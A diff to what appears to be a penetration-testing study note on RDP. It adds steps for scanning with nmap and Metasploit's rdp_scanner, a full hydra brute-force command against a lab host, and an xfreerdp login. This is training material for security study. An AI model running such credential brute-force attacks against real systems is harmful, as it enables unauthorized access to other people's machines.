@@ -90,5 +90,10 @@ OR
 - RDP uses TCP port 3389 by default, and can also be configured to run on any other TCP port.
 - We can perform an RDP brute-force attack to identify legitimate user credentials that we can use to gain remote access to the target system.
 
-Connect via **xfreerdp** : `xfreerdp /u:[username] /p:[password] /v:[ip_address]`
-#### Exploiting 
+Connect via **xfreerdp** : `xfreerdp /u:[username] /p:[password] /v:[ip_address]:[port]`
+#### Exploiting using metasploit
+
+1. Scan the host with nmap
+2. `use auxiliary/scanner/rdp/rdp_scanner` to confirm RDP port and version
+3. start brute force : `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://demo.ine.local -s 3333`
+4. connect to host using **xfreerdp**
